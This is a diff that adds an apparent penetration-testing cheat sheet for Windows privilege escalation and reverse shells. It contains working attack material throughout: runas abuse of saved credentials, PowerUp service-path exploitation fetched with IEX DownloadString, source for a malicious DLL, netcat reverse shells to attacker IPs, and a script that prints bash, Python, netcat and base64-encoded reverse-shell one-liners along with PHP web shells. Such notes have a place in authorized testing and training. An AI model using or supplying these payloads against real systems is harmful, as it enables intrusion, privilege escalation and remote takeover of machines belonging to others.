@@ -1,0 +1,132 @@
+/
+```
+cmdkey /list
+Currently stored credentials:
+ Target: Domain:interactive=WORKGROUP\Administrator
+ Type: Domain Password
+ User: WORKGROUP\Administrator
+Then you can use runas with the /savecred options in order to use the saved credentials. The following example is calling a remote binary via an SMB share.
+
+runas /savecred /user:WORKGROUP\Administrator "\\10.XXX.XXX.XXX\SHARE\evil.exe"
+runas /savecred /user:Administrator "cmd.exe /k whoami"
+Using runas with a provided set of credential.
+
+
+C:\Windows\System32\runas.exe /env /noprofile /user:<username> <password> "c:\users\Public\nc.exe -nc <attacker-ip> 4444 -e cmd.exe"
+
+$secpasswd = ConvertTo-SecureString "<password>" -AsPlainText -Force
+$mycreds = New-Object System.Management.Automation.PSCredential ("<user>", $secpasswd)
+$computer = "<hostname>"
+[System.Diagnostics.Process]::Start("C:\users\public\nc.exe","<attacker_ip> 4444 -e cmd.exe", $mycreds.Username, $mycreds.Password, $computer)
+
+##### Unquoted Service #####
+# find the vulnerable application
+C:\> powershell.exe -nop -exec bypass "IEX (New-Object Net.WebClient).DownloadString('https://your-site.com/PowerUp.ps1'); Invoke-AllChecks"
+
+...
+[*] Checking for unquoted service paths...
+ServiceName   : BBSvc
+Path          : C:\Program Files\Microsoft\Bing Bar\7.1\BBSvc.exe
+StartName     : LocalSystem
+AbuseFunction : Write-ServiceBinary -ServiceName 'BBSvc' -Path <HijackPath>
+...
+
+# automatic exploit
+Invoke-ServiceAbuse -Name [SERVICE_NAME] -Command "..\..\Users\Public\nc.exe 10.10.10.10 4444 -e cmd.exe"
+##### DLL Hijacking 2.0 #####
+#alias PowerUp='Write-HijackDll -DllPath 'C:\Temp\wlbsctrl.dll'
+##### DLL Hijacking ####
+# find missing DLL 
+- Find-PathDLLHijack PowerUp.ps1
+- Process Monitor : check for "Name Not Found"
+##### Unquoted Service Path ####
+#powershell -nop -exec bypass -c "(New-Object Net.WebClient).DownloadFile('http://192.168.0.114:8080/common.exe', 'C:\Program Files\Unquoted Path Service\common.exe')"
+
+# compile a malicious dll
+- For x64 compile with: "x86_64-w64-mingw32-gcc windows_dll.c -shared -o output.dll"
+- For x86 compile with: "i686-w64-mingw32-gcc windows_dll.c -shared -o output.dll"
+
+# content of windows_dll.c
+#include <windows.h>
+BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved) {
+    if (dwReason == DLL_PROCESS_ATTACH) {
+        system("cmd.exe /k whoami > C:\\Windows\\Temp\\dll.txt");
+        ExitProcess(0);
+    }
+    return TRUE;
+}
+
+##### shell info script ###
+'''
+LIP=$(ip -4 a show tun0 | grep -Po 'inet \K[\d.]+')
+
+if [ $# -eq 0 ]
+then
+  PORT=64385
+else
+  PORT=$1
+fi
+
+echo "Local IP=$LIP"
+echo "PORT=$PORT"
+
+echo ""
+echo '********** Bash **********'
+echo "bash -c 'bash -i >& /dev/tcp/$LIP/$PORT 0>&1'"
+echo "bash+-c+'bash+-i+>%26+/dev/tcp/$LIP/$PORT+0>%261'"
+echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc $LIP $PORT >/tmp/f"
+echo "rm%20/tmp/f;mkfifo%20/tmp/f;cat%20/tmp/f%7C/bin/sh%20-i%202%3E%261%7Cnc%20$LIP%20$PORT%20%3E/tmp/f"
+echo "nc $LIP $PORT -e /bin/sh"
+
+ENCODED=$(echo -ne "bash -c 'bash -i >& /dev/tcp/$LIP/$PORT 0>&1'" | base64 -w0)
+echo "echo $ENCODED | base64 -d | sh"
+
+echo ""
+echo '********** PHP **********'
+cat << "EOF"
+<?php
+  if(isset($_REQUEST['cmd'])){
+    echo "<pre>";
+    $cmd = ($_REQUEST['cmd']);
+    system($cmd);
+    echo "</pre>";
+    die;
+  }
+?>
+EOF
+echo '<%3fphp+if(isset($_REQUEST['cmd'])){+echo+"<pre>"%3b+$cmd+%3d+($_REQUEST['cmd'])%3b+system($cmd)%3b+echo+"</pre>"%3b+die%3b+}+%3f>'
+echo '<?php echo system($_GET['cmd']); ?>'
+echo '<%3fphp+echo+system($_GET[cmd])%3b+%3f>'
+
+echo ""
+echo '********** Python **********'
+echo '## Python 2'
+cat << EOF
+python -c "import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"$LIP\",$PORT));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(\"/bin/bash\")"
+EOF
+echo '## Python 3'
+cat << EOF
+/usr/bin/python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("$LIP",$PORT));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("bash")'
+EOF
+
+echo ""
+echo '********** PowerShell **********'
+echo "pshell.py $LIP $PORT"
+
+echo ""
+echo '********** Windows NetCat **********'
+echo ".\\nc.exe $LIP $PORT -e cmd.exe"
+
+echo ""
+echo '********** Interactive Shell **********'
+cat << EOF
+which python python2 python3
+python -c 'import pty;pty.spawn("/bin/bash")'
+python3 -c 'import pty;pty.spawn("/bin/bash")'
+export TERM=xterm-256color
+alias ll='ls -lsaht --color=auto'
+# Ctrl + Z [Background Process]
+stty raw -echo;fg;reset
+stty columns 118 rows 64
+EOF
+'''
